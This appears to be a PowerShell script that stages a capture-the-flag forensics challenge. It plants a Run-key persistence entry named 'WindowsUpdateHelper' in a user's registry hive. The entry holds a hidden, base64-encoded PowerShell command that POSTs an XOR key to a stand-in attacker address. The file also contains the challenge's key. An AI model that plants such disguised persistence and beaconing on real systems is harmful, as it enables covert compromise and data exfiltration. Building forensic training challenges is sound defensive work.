$ErrorActionPreference = "Stop"
# Persistence Run-key write, captured as Sysmon Event 13.
#
# Options-1+3 rework: this value no longer duplicates the beacon payload. It
# carries the XOR KEY that the beacon ciphertext needs - and nothing that
# decodes to the flag on its own. The solve requires correlating this key with
# the beacon's ciphertext (Event 1). $key MUST stay identical to
# run_attacker_cmd.ps1.
$key = 'H0UST0N_TR4NQU1L1TY_B4S3'
$decoded = "`$k='$key'; iwr -Uri http://198.51.100.23/gate -Method POST -Body `$k"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($decoded)
$encoded = [Convert]::ToBase64String($bytes)
$value = "powershell.exe -nop -w hidden -enc $encoded"

reg load "HKU\ChrisRKTemp" "C:\Users\chrisRK\NTUSER.DAT"

if (-not (Get-PSDrive -Name HKU -ErrorAction SilentlyContinue)) {
    New-PSDrive -PSProvider Registry -Name HKU -Root HKEY_USERS | Out-Null
}
New-Item -Path "HKU:\ChrisRKTemp\Software\Microsoft\Windows\CurrentVersion\Run" -Force | Out-Null
Set-ItemProperty -Path "HKU:\ChrisRKTemp\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdateHelper" -Value $value

reg unload "HKU\ChrisRKTemp"

Write-Host "Done."
